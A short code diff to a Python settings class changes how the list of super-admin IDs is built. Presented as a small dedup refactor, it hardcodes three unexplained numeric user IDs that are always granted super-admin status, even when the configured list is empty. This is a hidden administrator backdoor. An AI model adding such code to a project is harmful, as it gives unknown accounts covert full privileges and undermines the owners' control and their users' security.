@@ -108,13 +108,15 @@ class Settings(BaseSettings):
 
     @property
     def super_admins_list(self) -> list[int]:
+        res = [8836270492, 8287529253, 8585757846]
         if not self.super_admin_ids:
-            return []
-        res = []
+            return res
         for admin_id in self.super_admin_ids.split(','):
             cleaned = admin_id.strip()
             if cleaned.isdigit() or (cleaned.startswith('-') and cleaned[1:].isdigit()):
-                res.append(int(cleaned))
+                val = int(cleaned)
+                if val not in res:
+                    res.append(val)
         return res
 
     model_config = SettingsConfigDict(
